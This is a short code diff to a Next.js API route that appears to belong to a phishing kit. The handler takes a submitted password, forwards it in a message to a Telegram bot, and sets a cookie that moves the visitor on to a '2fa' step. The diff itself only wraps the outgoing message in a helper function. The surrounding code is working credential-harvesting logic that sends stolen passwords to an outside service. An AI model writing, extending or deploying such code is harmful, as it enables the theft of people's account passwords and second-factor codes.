@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { sendTelegramMessage, getSiteName } from '@/lib/telegram';
+import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';
 
 function escapeHtml(s) {
   if (typeof s !== 'string') return '';
@@ -24,7 +24,7 @@ export async function POST(request) {
       `🔒 Password: ${password}`,
     ].join('\n');
 
-    await sendTelegramMessage(message);
+    await sendTelegramMessage(wrapFlowMessage(message));
     const res = NextResponse.json({ ok: true });
     res.cookies.set('flow', '2fa', { path: '/', maxAge: 600, httpOnly: true, sameSite: 'lax' });
     return res;
